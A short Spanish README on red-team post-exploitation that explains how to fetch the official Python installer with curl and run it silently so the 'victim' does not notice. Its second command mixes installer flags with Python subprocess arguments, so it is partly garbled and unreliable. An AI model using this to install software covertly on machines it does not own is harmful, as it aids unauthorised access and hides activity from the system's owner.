# tecnicas red team (post explotación)
                                             
![Art Love GIF](https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExMjdrdWl6dTg3eHMwcnhxZjhpM3VmaTJsdzhrbzZlaGljaW4ydmd4MCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/VTRUeNCbZECfhV9o7E/giphy.gif)

Instala Python sin que tu "víctima" se dé cuenta.

# ¿Como funciona?
### Explicación del Comando

Este comando se divide en dos partes principales: **descarga** e **instalación** de Python. A continuación, se explica cada paso:

#### **1. Descarga el instalador de Python**

``curl https://www.python.org/ftp/python/3.11.4/python-3.11.4-amd64.exe --output python-3.11.4-amd64.exe``

* Utiliza curl para descargar la versión 3.11.4 de Python desde el sitio oficial.
* Guarda el archivo como python-3.11.4-amd64.exe en el directorio actual.

#### **2. Ejecuta el instalador de Python en modo silencioso**

``python-3.11.4-amd64.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE``

* /quiet: Instala Python sin mostrar ventanas ni requerir interacción.
* InstallAllUsers=1: Lo instala para todos los usuarios del sistema.
* PrependPath=1: Añade Python al PATH automáticamente.
* Include_test=0: Excluye archivos de prueba.
* shell=True: indica que se ejecutara en la consola de comandos
* stdout=subprocess.PIPE: Redirige la salida estándar (stdout) del comando ejecutado para que sea capturada en Python.
* stderr=subprocess.PIPE: Captura los errores del comando.
* stdin=subprocess.PIPE:  Permite enviar datos al comando mientras se ejecuta.
